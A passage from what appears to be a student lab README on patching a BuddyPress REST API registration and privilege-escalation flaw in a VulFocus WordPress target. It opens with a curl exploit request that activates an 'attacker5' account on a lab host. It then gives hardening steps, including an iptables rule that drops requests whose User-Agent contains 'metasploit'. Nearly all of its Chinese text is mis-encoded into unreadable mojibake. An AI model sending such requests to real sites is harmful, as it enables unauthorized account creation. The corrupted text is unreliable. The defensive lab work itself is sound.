 curl -X PUT -d '{"user_login": "attacker5", "user_email": "attacker5@163.com", "user_name": "attacker5", "password": "attacker5"}' http://192.168.20.12:81/wp-json/buddypress/v1/signup/activate/2pnXFe3HAC3A5SPWCf5OPbWd3LVO3C
```
- é€šè¿‡ curl å‘½ä»¤å‘ 81 ç«¯å£å‘é€ä¸€ä¸ªææƒçš„è¯·æ±‚ã€‚
- å¦‚æœ WAF é…ç½®æ­£ç¡®ï¼Œåº”è¯¥è¿”å› 403 Forbiddenï¼Œè¡¨ç¤ºè¯·æ±‚è¢«æ‹¦æˆªã€‚
- å¦‚æœè¯·æ±‚è¢«æ‹¦æˆªï¼ŒModSecurity ä¼šåœ¨æ—¥å¿—æ–‡ä»¶ä¸­è®°å½•è¯¦ç»†çš„è¯·æ±‚ä¿¡æ¯ã€‚
![1747959087953](image/readme/1747959087953.png)
![1747963376713](image/readme/1747963376713.png)

# å…¥å£æ¼æ´ä¿®å¤

### ä¸€.ç¯å¢ƒå‡†å¤‡
#### 1.ä¸‹è½½kali
 æ¨èä¸€ä¸ªä¸‹è½½kalié•œåƒå¾ˆå¿«çš„ç½‘ç«™ï¼šhttps://mirrors.aliyun.com/kali-images/kali-2024.4/?spm=a2c6h.25603864.0.0.732b571caXKqrs
![](./image/0.png)
#### 2. ä¸‹è½½å’Œé…ç½®docker
![](./image/2.png)
![](./image/3.png)
#### 3. æ‹‰å– VulFocus æ¼æ´é•œåƒ
![](./image/7.png)
#### 4. å¯åŠ¨ VulFocus å®¹å™¨
![](./image/9.png)
### äºŒ.ä¿®å¤æ¼æ´
#### 1.æ‰‹åŠ¨å®‰è£… / æ›´æ–° BuddyPress æ’ä»¶è‡³7.2.1
![](./image/10.png)
![](./image/11.png)
#### 2.# ç¦ç”¨å±é™©RESTç«¯ç‚¹
![](./image/12.png)
#### 3.æ–‡ä»¶ä¸Šä¼ é˜²æŠ¤
åœ¨ wp-config.php ä¸­æ·»åŠ é…ç½®
![](./image/13.png)
![](./image/14.png)
DISALLOW_UNFILTERED_HTML è®¾ç½®ä¸º true å¯ä»¥ç¦æ­¢æœªè¿‡æ»¤çš„ HTML ä¸Šä¼ ï¼Œå¢å¼ºå®‰å…¨æ€§ï¼›  
WP_ALLOW_MULTISITE è®¾ç½®ä¸º false å¯ä»¥ç¦ç”¨ WordPress å¤šç«™ç‚¹åŠŸèƒ½
#### 4.é™åˆ¶ä¸Šä¼ æ–‡ä»¶ç±»å‹
![](./image/16.png)
è¿™æ®µä»£ç çš„ä½œç”¨æ˜¯åŒ¹é…æ‰©å±•åä¸º .phpã€.phtml å’Œ .phar çš„æ–‡ä»¶ï¼Œç„¶åç¦æ­¢æ‰€æœ‰æ¥æºå¯¹è¿™äº›æ–‡ä»¶çš„è®¿é—®ï¼Œä»è€Œé˜²æ­¢æ¶æ„ä¸Šä¼ å¯æ‰§è¡Œè„šæœ¬æ–‡ä»¶ã€‚æ·»åŠ å®Œæˆåï¼Œä¿å­˜å¹¶å…³é—­æ–‡ä»¶ã€‚
#### 5.API æƒé™æ§åˆ¶
![](./image/17.png)
wp role reset subscriber å‘½ä»¤ç”¨äºé‡ç½® subscriber è§’è‰²çš„æƒé™åˆ°é»˜è®¤çŠ¶æ€ï¼›    
wp cap remove subscriber read å‘½ä»¤ç”¨äºç§»é™¤ subscriber è§’è‰²çš„ read èƒ½åŠ›ï¼Œè¿›ä¸€æ­¥é™åˆ¶å…¶å¯¹ç½‘ç«™å†…å®¹ï¼ˆåŒ…æ‹¬ /wp-json ç›¸å…³ API ï¼‰çš„è®¿é—®æƒé™ã€‚
#### 6.æ·»åŠ æ—¥å¿—é…ç½®å†…å®¹
![](./image/18.png)
è¿™éƒ¨åˆ†é…ç½®å®šä¹‰äº†ä¸€ç§æ–°çš„æ—¥å¿—æ ¼å¼ sec_audit ï¼ŒåŒ…å«å®¢æˆ·ç«¯ IPï¼ˆ%h ï¼‰ã€è¿œç¨‹ç”¨æˆ·åï¼ˆ%l ï¼‰ã€è®¤è¯ç”¨æˆ·åï¼ˆ%u ï¼‰ã€è¯·æ±‚æ—¶é—´ï¼ˆ%t ï¼‰ã€è¯·æ±‚è¡Œï¼ˆ%r ï¼‰ã€çŠ¶æ€ç ï¼ˆ%>s ï¼‰ã€å“åº”å¤§å°ï¼ˆ%b ï¼‰ã€å¼•ç”¨é¡µï¼ˆ%{Referer}i ï¼‰å’Œç”¨æˆ·ä»£ç†ï¼ˆ%{User-Agent}i ï¼‰ç­‰ä¿¡æ¯ï¼Œå¹¶æŒ‡å®šå°†ç¬¦åˆè¯¥æ ¼å¼çš„æ—¥å¿—è®°å½•åˆ° /var/log/apache2/security_audit.log æ–‡ä»¶ä¸­ã€‚
#### 7.é˜²ç«å¢™è®¾ç½®
ä¸‹è½½é˜²ç«å¢™
![](./image/19.png)
æ·»åŠ è§„åˆ™
![](./image/20.png)
ç¬¬ä¸€æ¡å‘½ä»¤åˆ›å»ºäº†ä¸€ä¸ªåä¸º WPAPI çš„æœ€è¿‘è¿æ¥è®°å½•é›†ï¼Œç”¨äºè·Ÿè¸ªè®¿é—® 80 ç«¯å£ï¼ˆHTTP ç«¯å£ ï¼‰çš„ TCP è¿æ¥ã€‚ç¬¬äºŒæ¡å‘½ä»¤è®¾ç½®åœ¨ 60 ç§’å†…ï¼Œå¦‚æœåŒä¸€ä¸ªæº IP å¯¹ 80 ç«¯å£çš„è®¿é—®æ¬¡æ•°è¾¾åˆ° 10 æ¬¡ï¼Œå°±ä¸¢å¼ƒåç»­çš„è¿æ¥è¯·æ±‚ï¼Œä»¥æ­¤é™åˆ¶ REST API çš„è®¿é—®é¢‘ç‡ï¼Œé˜²æ­¢æ¶æ„é«˜é¢‘è®¿é—®ã€‚
é˜»æ–­å¼‚å¸¸ User-Agent
![](./image/21.png)
è¯¥å‘½ä»¤ä½¿ç”¨å­—ç¬¦ä¸²åŒ¹é…æ¨¡å—ï¼ˆ-m string ï¼‰ï¼Œé‡‡ç”¨ bm ç®—æ³•ï¼ˆ--algo bm ï¼‰ï¼Œå½“æ£€æµ‹åˆ°è¯·æ±‚ä¸­çš„ User-Agent å­—æ®µåŒ…å« metasploit æ—¶ï¼Œå°±ä¸¢å¼ƒè¯¥è¯·æ±‚ï¼Œä»è€Œé˜»æ–­å¯èƒ½æ¥è‡ªæ¶æ„å·¥å…·çš„è®¿é—®ã€‚
### ä¸‰.ä¿®å¤éªŒè¯
è‡ªåŠ¨åŒ–æµ‹è¯•è„šæœ¬
![](./image/22.png)
è¿™æ®µä»£ç ä½¿ç”¨ curl å‘½ä»¤å‘ http://localhost:8080/wp-json/buddypress/v1/signup å‘é€ä¸€ä¸ª POST è¯·æ±‚ï¼Œæºå¸¦æ³¨å†Œç”¨æˆ·çš„ç›¸å…³ä¿¡æ¯ï¼ˆç”¨æˆ·åã€é‚®ç®±ã€å¯†ç  ï¼‰ï¼Œæ¨¡æ‹Ÿæ”»å‡»è€…å°è¯•åˆ©ç”¨æ³¨å†Œç»•è¿‡æ¼æ´è¿›è¡Œæ³¨å†Œã€‚
ç»“æœï¼š
![](./image/24.png)




## å‚è€ƒèµ„æ–™

[æ•™å­¦è¯¾ä»¶](https://c4pr1c3.github.io/cuc-ns-ppt/vuls-awd.md.v4.html#/%E5%BB%BA%E7%AB%8B%E7%AB%8B%E8%B6%B3%E7%82%B9%E5%B9%B6%E5%8F%91%E7%8E%B0%E9%9D%B6%E6%A0%872-4)
[æ•™å­¦è§†é¢‘ã€ç½‘ç»œå®‰å…¨(2023) ç»¼åˆå®éªŒã€‘](https://www.bilibili.com/video/BV1p3411x7da?vd_source=e1f7434c660a15bfac556224e06c742a)
[æ•™å­¦è§†é¢‘ã€ç¬¬å…­ç«  ç½‘ç»œä¸ç³»ç»Ÿæ¸—é€ã€‘](https://www.bilibili.com/video/BV1qV41127Xv?p=10&vd_source=e1f7434c660a15bfac556224e06c742a)